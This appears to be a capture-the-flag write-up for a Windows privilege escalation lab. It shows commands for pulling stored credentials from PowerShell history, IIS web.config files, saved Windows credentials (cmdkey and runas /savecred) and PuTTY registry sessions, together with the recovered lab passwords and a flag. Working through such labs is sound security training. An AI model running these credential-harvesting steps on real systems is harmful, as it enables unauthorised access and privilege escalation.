#### A password for the julia.jones user has been left on the Powershell history. What is the password?

PS type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

cmdkey /add:thmdc.local /user:julia.jones /pass:ZuperCkretPa5z


#### A web server is running on the remote host. Find any interesting password on web.config files associated with IIS. What is the password of the db_admin user?

                <add connectionStringName="LocalSqlServer" maxEventDetailsLength="1073741823" buffer="false" bufferMode="Notification" name="SqlWebEventProvider" type="System.Web.Management.SqlWebEventProvider,System.Web,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a" />
                    <add connectionStringName="LocalSqlServer" name="AspNetSqlPersonalizationProvider" type="System.Web.UI.WebControls.WebParts.SqlPersonalizationProvider, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
    <connectionStrings>
        <add connectionString="Server=thm-db.local;Database=thm-sekure;User ID=db_admin;Password=098n0x35skjD3" name="THM-DB" />
    </connectionStrings>

    

#### There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop.

PS C:\Users\thm-unpriv> cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=WPRIVESC1\mike.katz
    Type: Domain Password
    User: WPRIVESC1\mike.katz

    PS C:\Users\thm-unpriv> runas /savecred /user:mike.katz cmd.exe
Attempting to start cmd.exe as user "WPRIVESC1\mike.katz" ...
PS C:\Users\thm-unpriv> whoami
wprivesc1\thm-unpriv
PS C:\Users\thm-unpriv>


C:\Windows\system32>whoami
wprivesc1\mike.katz


THM{WHAT_IS_MY_PASSWORD}


#### Retrieve the saved password stored in the saved PuTTY session under your profile. What is the password for the thom.smith user?


PS C:\Users\thm-unpriv> reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\My%20ssh%20server
    ProxyExcludeList    REG_SZ
    ProxyDNS    REG_DWORD    0x1
    ProxyLocalhost    REG_DWORD    0x0
    ProxyMethod    REG_DWORD    0x0
    ProxyHost    REG_SZ    proxy
    ProxyPort    REG_DWORD    0x50
    ProxyUsername    REG_SZ    thom.smith
    ProxyPassword    REG_SZ    CoolPass2021
    ProxyTelnetCommand    REG_SZ    connect %host %port\n
    ProxyLogToTerm    REG_DWORD    0x1
